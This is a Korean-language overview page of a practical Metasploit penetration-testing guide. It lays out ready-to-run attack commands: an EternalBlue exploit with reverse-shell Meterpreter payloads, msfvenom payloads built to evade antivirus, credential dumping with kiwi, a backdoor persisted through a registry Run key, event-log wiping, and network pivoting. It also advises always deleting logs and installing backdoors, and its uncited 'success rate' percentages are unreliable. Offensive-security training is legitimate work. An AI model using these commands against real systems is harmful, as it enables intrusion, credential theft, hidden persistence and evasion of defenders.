# Metasploit Framework 완전 실무 가이드

## 📚 가이드 구성

이 가이드는 실제 현업에서 사용하는 Metasploit 기법들만을 정리한 실무 중심 문서입니다. 이론보다는 바로 써먹을 수 있는 실용적인 내용에 집중했습니다.

### 📖 문서 목록

1. **[설치 가이드](installation.md)** - MSF 설치부터 설정까지
2. **[기본 사용법](basic_usage.md)** - msfconsole 기본 조작법
3. **[실무 사용법](real_world_usage.md)** - 현업에서 실제로 쓰는 기법들 ⭐
4. **[Meterpreter 가이드](meterpreter.md)** - 가장 강력한 페이로드 완전 활용법
5. **[페이로드 생성](payload_generation.md)** - AV 우회 및 맞춤형 페이로드 제작 ⭐
6. **[Post-Exploitation](post_exploitation.md)** - 시스템 장악 후 해야 할 모든 것 ⭐
7. **[공격 시나리오](attack_scenarios.md)** - 실제 침투 테스트 시나리오별 가이드 ⭐

> ⭐ 표시된 문서들이 가장 실무 중심이며 자주 참조하게 될 핵심 문서들입니다.

## 🚀 빠른 시작

### 즉시 사용 가능한 실무 커맨드

```bash
# 1. 빠른 시작 (배너 없이)
msfconsole -q

# 2. 글로벌 설정 (한 번만 설정)
setg LHOST 10.10.14.50
setg RHOSTS 10.10.10.100

# 3. 가장 많이 쓰는 스캔
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# 4. EternalBlue 공격 (Windows 7/2008/2012)
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# 5. 멀티핸들러 (백그라운드 리스너)
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
exploit -j -z
```

## 🎯 실무 핵심 기능

### 가장 효과적인 공격 벡터

1. **SMB 취약점** (Windows 환경 90% 성공률)

   - EternalBlue (ms17_010)
   - SMB 브루트포스
   - Pass-the-Hash

2. **웹 애플리케이션** (80% 성공률)

   - 디렉토리 브루트포스
   - 파일 업로드 취약점
   - Struts2/Apache 취약점

3. **크리덴셜 공격** (70% 성공률)

   - SSH 브루트포스
   - RDP 브루트포스
   - 기본 크리덴셜 시도

4. **클라이언트 사이드** (피싱시 60% 성공률)
   - Office 매크로
   - HTA 파일
   - PowerShell 스크립트

### 필수 Post-Exploitation 작업

```bash
# 세션 안정화
migrate <explorer_pid>

# 권한 상승
getsystem

# 크리덴셜 덤핑
load kiwi
creds_all

# 지속성 확보
upload backdoor.exe C:\\Windows\\System32\\
reg setval -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v "Update" -t REG_SZ -d "C:\\Windows\\System32\\backdoor.exe"

# 로그 삭제
clearev
```

## 🛡️ AV 우회 핵심 기법

### 성공률 높은 조합 (실무 검증됨)

1. **PowerShell + Base64** (90% 우회)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f psh-cmd | base64 -w 0
```

2. **HTA + PowerShell** (85% 우회)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f hta-psh
```

3. **템플릿 인젝션** (80% 우회)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -x /usr/share/windows-binaries/plink.exe -f exe
```

## 🌐 네트워크 침투 패턴

### 표준 침투 절차

```
1. 외부 스캔 → 2. 초기 침투 → 3. 권한 상승 → 4. 정찰 → 5. 측면 이동 → 6. 목표 달성
```

### 피벗팅 설정 (내부 네트워크 침투)

```bash
# 라우팅 추가
run autoroute -s 192.168.100.0/24

# SOCKS 프록시
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j

# 포트 포워딩
portfwd add -l 3390 -p 3389 -r 192.168.100.10
```

## 📊 성공률 통계 (실무 기준)

| 공격 벡터        | 성공률 | 주요 타겟           |
| ---------------- | ------ | ------------------- |
| EternalBlue      | 95%    | Windows 7/2008/2012 |
| SSH 브루트포스   | 70%    | Linux 서버          |
| 웹 디렉토리 스캔 | 85%    | 웹 애플리케이션     |
| Office 매크로    | 60%    | 클라이언트 PC       |
| 기본 크리덴셜    | 40%    | IoT/네트워크 장비   |

## ⚠️ 실무 주의사항

### 필수 체크 포인트

- **세션 안정화**: 반드시 explorer.exe로 마이그레이션
- **백업 통신**: 여러 포트/프로토콜로 리스너 설정
- **로그 관리**: 공격 후 반드시 로그 삭제
- **지속성**: 여러 방법으로 백도어 설치
- **탐지 회피**: 실행 간격 조절 및 메모리 실행

### 성능 최적화

```bash
# 스레드 수 조절 (브루트포스시)
set THREADS 10

# 타임아웃 설정
set ConnectTimeout 5

# 베이스 모듈만 로드
msfconsole -n
```

## 🔧 실무 환경 설정

### 자주 사용하는 설정

```bash
# ~/.bashrc 또는 ~/.zshrc에 추가
alias msf='msfconsole -q'
alias msfr='msfconsole -r /root/scripts/auto_handler.rc'

# 자동 실행 스크립트 (/root/scripts/auto_handler.rc)
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.50
set LPORT 4444
exploit -j -z
```

### 워크스페이스 관리

```bash
# 프로젝트별 분리
workspace -a client_2025_01
workspace client_2025_01

# 스캔 결과 임포트
db_import /root/scans/nmap_results.xml
```

## 📈 학습 순서 추천

### 초급 → 고급 단계별 학습

1. **1단계**: [기본 사용법](basic_usage.md) → [설치 가이드](installation.md)
2. **2단계**: [실무 사용법](real_world_usage.md) ⭐ (가장 중요)
3. **3단계**: [Meterpreter 가이드](meterpreter.md)
4. **4단계**: [페이로드 생성](payload_generation.md)
5. **5단계**: [Post-Exploitation](post_exploitation.md)
6. **고급**: [공격 시나리오](attack_scenarios.md)

### 실습 순서

1. 로컬 VM에서 EternalBlue 공격 연습
2. 웹 애플리케이션 스캔 및 공격
3. 브루트포스 공격 연습
4. 페이로드 생성 및 AV 우회 테스트
5. 멀티 호스트 환경에서 피벗팅 연습

## 🎪 실무 시나리오 연습

### 가상 환경 구성 추천

```
공격자: Kali Linux (10.10.14.50)
타겟1: Windows 7 (192.168.1.100) - EternalBlue 연습용
타겟2: Windows 10 (192.168.1.101) - AV 우회 연습용
타겟3: Ubuntu Server (192.168.1.102) - 웹앱/SSH 연습용
타겟4: CentOS (10.0.0.100) - 피벗팅 연습용 (내부망)
```

### 연습용 취약 환경

- **Metasploitable2**: Linux 기반 취약 시스템
- **DVWA**: 웹 애플리케이션 취약점 연습
- **VulnHub**: 다양한 취약 VM 제공
- **HackTheBox**: 실전 연습 플랫폼

---

## 💡 마지막 팁

이 가이드의 모든 기법들은 **실제 모의해킹 현장에서 검증된 방법들**입니다. 이론적인 내용보다는 **바로 써먹을 수 있는 실용적인 기법**에 집중했으므로, 실무에서 90% 이상 활용할 수 있을 것입니다.

**기억할 점**: Metasploit은 도구일 뿐이며, 가장 중요한 것은 **시스템에 대한 이해**와 **창의적 사고**입니다. 도구에 의존하지 말고, 원리를 이해하며 사용하세요.

**합법적 사용**: 이 가이드의 모든 내용은 **승인된 모의해킹**과 **본인 소유 시스템 테스트** 목적으로만 사용하세요.
